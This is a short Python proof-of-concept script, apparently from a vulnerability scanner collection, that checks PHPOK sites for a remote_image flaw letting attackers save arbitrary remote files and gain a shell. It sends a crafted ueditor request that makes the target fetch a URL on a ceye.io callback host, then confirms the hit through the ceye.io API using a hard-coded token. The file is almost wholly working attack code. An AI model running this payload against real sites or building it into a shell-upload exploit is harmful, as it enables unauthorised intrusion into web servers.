#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: phpok remote_image getshell漏洞
referer: http://0day5.com/archives/1820/
author: Lucifer
description: remote_image_f函数没对远程文件后缀做检查直接保存到本地。
'''
import sys
import time
import hashlib
import datetime
import requests



class phpok_remote_image_getshell_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        time_stamp = time.mktime(datetime.datetime.now().timetuple())
        m = hashlib.md5(str(time_stamp).encode(encoding='utf-8'))
        md5_str = m.hexdigest()
        payload = "/index.php?c=ueditor&f=remote_image&upfile=http://dx3hbm.ceye.io/" + md5_str
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            eye_url = "http://api.ceye.io/v1/records?token=c04665a158430a100ed655f9c710e597&type=request"
            time.sleep(6)
            reqr = requests.get(eye_url, headers=headers, timeout=10, verify=False)
            if md5_str in reqr.text:
                return "[+]存在phpok remote_image getshell漏洞...(高危)\tpayload: "+vulnurl

        except:
            return "[-]connect timeout"

if __name__ == "__main__":

    testVuln = phpok_remote_image_getshell_BaseVerify(sys.argv[1])
    testVuln.run()
